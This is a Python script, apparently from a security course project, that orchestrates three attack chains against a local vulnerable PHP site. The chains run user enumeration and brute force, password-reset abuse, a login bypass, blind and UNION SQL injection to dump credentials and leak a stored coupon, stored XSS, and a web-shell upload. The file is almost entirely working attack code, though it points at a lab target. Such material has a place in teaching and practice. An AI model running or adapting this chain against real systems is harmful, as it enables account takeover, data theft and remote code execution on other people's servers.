import sys

import requests

import enum_and_brute
import Broken_Password_Reset
import SQLi_UNION
import web_shell
import stored_xss
import SQLi
import SQLi_Blind

VULNERABLE_SITE_URL = "http://localhost/CyberProject"


def discover_first_table(baseline):
    """Leak the first sqlite_master table name by composing SQLi_Blind's generic leaker."""
    source = "SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET 0"
    return SQLi_Blind.leak_string(source, baseline, "TABLE")


def chain_1_breach_blind_sql_and_stored_xss():
    print("\n" + "="*60)
    print("CHAIN 1: BREACH VIA BLIND SQLi & STORED XSS (Discovery -> Access -> Blind SQLi -> Stored XSS)")
    print("="*60)
    
    # Phase 1: User discovery & quick brute force
    print("[*] Phase 1: Discovering valid users...")
    cracked_accounts, discovered_usernames = enum_and_brute.run_attack()
    
    target_user = None
    target_pwd = None

    if not discovered_usernames:
        print("[-] No users discovered. Finishing chain without success.")
        return

    # Phase 2: Gain access (cheap brute force, intensive brute force, or broken reset)
    if cracked_accounts:
        # If we found a working password immediately, use it
        target_user, target_pwd = cracked_accounts[0]
        print(f"[+] Quick Brute Force succeeded")

    if not target_pwd:
        print("[*] Launching Intensive Brute Force...")
        for user in discovered_usernames:
            print(f"\n[*] Attempting to gain access to user: {user}")
            pwd = Broken_Password_Reset.try_brute_force(user=user, passwords="passwords.txt")
            
            if pwd:
                target_user = user
                target_pwd = pwd
                print(f"[+] SUCCESS: Access gained via Brute Force for {target_user}!")
                break

        if not target_pwd:
            print("[-] Intensive Brute Force failed. Falling back to Logic Bypass (Reset)...")
            target_user = discovered_usernames[0]
            target_pwd = Broken_Password_Reset.run_reset_password(user=target_user)
        
            # Check if we got a password from either method
            if target_pwd:
                print(f"[+] SUCCESS: Access gained for {target_user}!")
            else:
                print(f"[-] Chain 1 failed: Could not compromise any account.")
                return

    # Phase 3 & 4: Exfiltrate a secret via blind SQLi, then plant stored XSS
    if target_user and target_pwd:
        print(f"[*] Phase 3: Blind SQLi as {target_user}...")
        login_url = f"{VULNERABLE_SITE_URL}/login.php"
        session = requests.Session()
        session.post(login_url, data={
            'username': target_user,
            'password': target_pwd,
            'login_submit': ''
        }, allow_redirects=False)
        sid = session.cookies.get('PHPSESSID')
        if sid:
            SQLi_Blind.COOKIES['PHPSESSID'] = sid
            baseline = SQLi_Blind.get_baseline()
            table = discover_first_table(baseline)
            if table:
                coupon = SQLi_Blind.leak_data_unlimited(table, "encrypted_code", baseline)
                print(f"\n[!!!] SUCCESS: Stolen VIP Coupon: {coupon}")

        print(f"[*] Phase 4: Stored XSS as {target_user}...")
        stored_xss.perform_stored_xss(username=target_user, password=target_pwd)
    else:
        print("[-] Chain 1 failed: No access gained to any account.")


def chain_2_web_shell():
    print("\n" + "="*60)
    print("CHAIN 2: DATA BREACH TO WEB SHELL (Union SQLi -> Web Shell)")
    print("="*60)

    # Phase 0: Authenticate as a known user to get a session for UNION SQLi
    print("[*] Phase 0: Logging in as 'HUCKER' to get a valid session...")
    login_url = f"{VULNERABLE_SITE_URL}/login.php"
    creds = {'username': 'HUCKER', 'password': 'hucker123', 'login_submit': ''}
    
    session = requests.Session()
    res = session.post(login_url, data=creds, allow_redirects=True)

    if "home.php" in res.url or "HUCKER" in res.text:
            sid = session.cookies.get('PHPSESSID')
            print(f"[+] Login Successful!")
    else:
        print("[-] Login failed. Check if HUCKER exists in the DB.")
        return
        
    print("[*] Phase 1: Dumping database via UNION SQLi...")
    users = SQLi_UNION.dump_users(session_id=sid)
    
    if users:
        # Phase 2: Pick a non-admin account from the dump
        # Select the last compromised account from the database dump (less likely to be the admin)
        target_user, target_pwd = users[-1]  
        print(f"[*] Phase 2: Using stolen credentials: {target_user}")
        
        # Phase 3: Upload and execute a web shell
        print(f"[*] Phase 3: Web shell as {target_user}...")
        web_shell.run_ultimate_web_shell(username=target_user, password=target_pwd)
    else:
        print("[-] Chain 2 failed: SQLi Union returned no data.")


def chain_3_stealth():
    print("\n" + "="*60)
    print("CHAIN 3: STEALTH LEAK (Login Bypass -> Blind SQLi)")
    print("="*60)
    
    # 1. Bypass login and get the session ID
    sid = SQLi.sql_login_bypass()
    
    if sid:
        # 2. Directly update the cookie in your existing script
        SQLi_Blind.COOKIES['PHPSESSID'] = sid
        
        # 3. Run your existing functions in order
        baseline = SQLi_Blind.get_baseline()
        
        # You can choose to discover the table or go straight to leaking
        table = discover_first_table(baseline)
        
        if table:
            # Call your original leaking function
            coupon = SQLi_Blind.leak_data_unlimited(table, "encrypted_code", baseline)
            print(f"\n[!!!] SUCCESS: Stolen VIP Coupon: {coupon}")
    else:
        print("[-] Chain 3 failed: Login bypass did not work.")

        
def main():
    if len(sys.argv) < 2:
        print("\n[!] Error: No chain selected.")
        print("Usage: python master_kill_chain.py [1/2/3]")
        print("  1: Breach via Blind SQLi & Stored XSS (Enum -> Brute / Reset -> Blind SQLi -> Stored XSS)")
        print("  2: Data Breach to Web Shell (Union SQLi -> Web Shell)")
        print("  3: Stealth Secret Chain (Bypass -> Blind SQLi)")
        return

    choice = sys.argv[1]
    if choice == "1":
        chain_1_breach_blind_sql_and_stored_xss()
    elif choice == "2":
        chain_2_web_shell()
    elif choice == "3":
        chain_3_stealth()
    else:
        print("[!] Invalid selection. Please choose 1, 2, or 3.")

if __name__ == "__main__":
    main()
